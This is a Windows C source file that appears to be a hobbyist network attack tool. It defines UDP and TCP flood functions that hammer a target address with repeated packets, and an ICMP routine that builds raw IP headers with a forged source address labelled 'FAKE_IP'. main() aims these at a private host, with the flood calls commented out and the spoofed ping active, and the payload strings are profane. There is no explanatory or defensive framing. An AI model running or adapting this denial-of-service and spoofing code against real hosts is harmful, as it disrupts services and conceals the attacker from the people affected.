#pragma comment(lib,"ws2_32.lib")
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <process.h>
struct IPHeader{
	unsigned char ver_hlen;
	unsigned char tos;
	unsigned short total_len;
	unsigned short ident;
	unsigned short frag_and_flags;
	unsigned char ttl;
	unsigned char proto;
	unsigned short checksum;
	unsigned int sourceIP;
	unsigned int destIP;
};
struct ICMPHeader{
	unsigned char type;
	unsigned char code;
	unsigned short cksum;
	unsigned short id;
	unsigned short seq;
	//char  fucker[10];
};
int UDP_flood(char * flood_str,unsigned int times,sockaddr_in &DestAddr){
	int ErrorCode=0;
	SOCKET sock;
	WSADATA wsaData;
	ErrorCode=WSAStartup(WINSOCK_VERSION,&wsaData);
	if(ErrorCode!=0){
		fprintf(stderr,"WSAStartup failed: %d\n",ErrorCode);
		return 0;
	}
	sock=socket(AF_INET,SOCK_DGRAM,0);
	//connect(sock,(sockaddr*)&DestAddr,sizeof(DestAddr));
	for(int i=0;i<times;i++){
		ErrorCode=sendto(sock,flood_str,strlen(flood_str),0,(sockaddr*)&DestAddr,sizeof(DestAddr));
		if(ErrorCode==SOCKET_ERROR){
			printf("Fail");
		}
	}
	closesocket(sock);
	WSACleanup();
	printf("UDP_Flood_Finished\n");
}
int TCP_flood(char * flood_str,unsigned int times,sockaddr_in &DestAddr){
	int ErrorCode=0;
	SOCKET sock;
	WSADATA wsaData;
	ErrorCode=WSAStartup(WINSOCK_VERSION,&wsaData);
	if(ErrorCode!=0){
		fprintf(stderr,"WSAStartup failed: %d\n",ErrorCode);
		return 0;
	}
	sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	//#define WM_CUSTOM_NETWORK_MSG (WM_USER + 100)  
	for(int i=0;i<times;i++){
		//WSAAsyncSelect(sock, NULL, WM_CUSTOM_NETWORK_MSG, FD_CONNECT); //将连接设置为非阻塞 
		connect(sock,(sockaddr*)&DestAddr,sizeof(DestAddr));
		if(ErrorCode==SOCKET_ERROR){
			printf("Fail");
		}
		ErrorCode=send(sock,flood_str,strlen(flood_str),0);
		closesocket(sock);
		sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	}
	WSACleanup();
	printf("TCP_Flood_Finished\n");
}
#define ICMP_ECHO_REPLY 0
#define ICMP_ECHO_REQUEST 8
#define PACKAGE_SIZE sizeof(IPHeader)+sizeof(ICMPHeader)
#define xmalloc(s) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,(s))
#define xfree(p) HeapFree(GetProcessHeap(),0,(p))
void usage();
void HandleError(char *);
void FillPackage(char *,unsigned long,unsigned long,u_short);
USHORT CheckSum(USHORT *,int);

int ICMP_ping(int times,sockaddr_in from,sockaddr_in to){
	IPHeader iphdr;
	ICMPHeader icmphdr;
	unsigned long srcIP=from.sin_addr.s_addr;
	unsigned long dstIP=to.sin_addr.s_addr;
	bool bBroadcast=false;
	int pid=_getpid();
	int len=sizeof(to);
	WSAData wsaData;
	WSAStartup(WINSOCK_VERSION,&wsaData);
	SOCKET sock=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP);
	if(sock==INVALID_SOCKET){
		HandleError("socket");
		WSACleanup();
		return -1;
	}
	BOOL on=TRUE;
	if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char*)&on,sizeof(on))==SOCKET_ERROR){
		HandleError("setsockopt");
		WSACleanup();
		return -1;
	}
	//bind(sock,(sockaddr*)&from,sizeof(from));
	char * buf=(char*)xmalloc(PACKAGE_SIZE);
	struct timeval tv;
	fd_set readSet;
	BOOL bError=false;

	for(int i=0;i<times && !bError;i++){
		printf("ping %s ... %d/n",inet_ntoa(to.sin_addr),i+1);
		FillPackage(buf,srcIP,dstIP,(u_short)pid);
		if(sendto(sock,buf,PACKAGE_SIZE,0,(struct sockaddr *)&to,len)==SOCKET_ERROR){
			HandleError("sendto");
			break;
		}
		while(1){
			tv.tv_sec=3;
			tv.tv_usec=0;
			FD_ZERO(&readSet);
			FD_SET(sock,&readSet);
			int res=select(sock+1,&readSet,NULL,NULL,&tv);
			if(res==SOCKET_ERROR){
				HandleError("select");
				bError=true;
				break;
			}
			if(res==0){
				if(!bBroadcast){
					printf("time out!\n");
				}
				break;
			}
			if(FD_ISSET(sock,&readSet)){
				memset(buf,0,PACKAGE_SIZE);
				memset(&from,0,sizeof(from));
				len=sizeof(from);
				if(recvfrom(sock,buf,PACKAGE_SIZE,0,(struct sockaddr*)&from,&len)==SOCKET_ERROR){
					HandleError("recvfrom");
					bError = true;
					break;
				}
				IPHeader * pIPHdr=(IPHeader *)buf;
				ICMPHeader * pICMPHeader=(ICMPHeader *) (buf + sizeof(IPHeader));
				if(pICMPHeader->id==htons((u_short)pid)
					&& pICMPHeader->seq==htons((u_short)pid)
					&& pICMPHeader->type==ICMP_ECHO_REPLY){
						printf("Echo reply from %s \n",inet_ntoa(from.sin_addr));
						if(!bBroadcast)break;
				}
					

			}
		}
	}
	xfree(buf);
	closesocket(sock);
	WSACleanup();
	return 0;
}

void FillPackage(char * pData,unsigned long srcIP,unsigned long dstIP,u_short id){
	memset(pData,0,PACKAGE_SIZE);
	IPHeader * pIPHeader=(IPHeader *)pData;
	int nVersion=4;
	int nHeadSize=sizeof(IPHeader)/4;
	unsigned long destIP=dstIP;
	pIPHeader->ver_hlen=(nVersion<<4)|nHeadSize;
	pIPHeader->tos=0;
	pIPHeader->total_len=htons(PACKAGE_SIZE);
	pIPHeader->ident=htons(1234);
	pIPHeader->frag_and_flags=0;
	pIPHeader->ttl=255;
	pIPHeader->proto=IPPROTO_ICMP;
	pIPHeader->checksum=0;
	pIPHeader->sourceIP=srcIP;
	
	pIPHeader->destIP=destIP;
	pIPHeader->checksum=CheckSum((USHORT*)pData,sizeof(IPHeader));
	ICMPHeader *pICMPHeader = (ICMPHeader*)(pData+sizeof(IPHeader));
	pICMPHeader->type=ICMP_ECHO_REQUEST;
	pICMPHeader->code=0;
	pICMPHeader->cksum=0;
	pICMPHeader->id=htons(id);
	pICMPHeader->seq=htons(id);
	//strcpy(pICMPHeader->fucker,"fuckyoumom");
	pICMPHeader->cksum=CheckSum((USHORT *)((char *)pData + sizeof(IPHeader)),sizeof(ICMPHeader));
	
}
USHORT CheckSum(USHORT * pUShort,int size){
	unsigned long cksum=0;
	while(size>1){
		cksum+=*pUShort++;
		size-=sizeof(USHORT);
	}
	if(size){
		cksum+=*(UCHAR *)pUShort;

	}
	cksum=(cksum>>16)+(cksum&0xffff);
	cksum+=(cksum>>16);
	return (USHORT)(~cksum);
}
void usage(){
	printf("usage:ping host IP");
}
void HandleError(char * func){
	int errCode=WSAGetLastError();
	char info[65]={0};
	_snprintf(info,64,"%s:%d\n",func,errCode);
	printf(info);
}
int main(){
	char * FAKE_IP="10.2.124.2";
	char * SYN_DEST_IP="10.2.124.33";
	struct sockaddr_in SrcAddr,DestAddr;
	memset(&SrcAddr,0,sizeof(SrcAddr));
	SrcAddr.sin_family=AF_INET;
	SrcAddr.sin_addr.s_addr=inet_addr(FAKE_IP);
	SrcAddr.sin_port=htons(80);
	memset(&DestAddr,0,sizeof(DestAddr));
	DestAddr.sin_family=AF_INET;
	DestAddr.sin_addr.s_addr=inet_addr(SYN_DEST_IP);
	DestAddr.sin_port=htons(80);
	//UDP_flood("FuckYourMom!!!",100,DestAddr);
	//TCP_flood("FuckYourDad!!!",10,DestAddr);
	ICMP_ping(3,SrcAddr,DestAddr);
	system("PAUSE");
}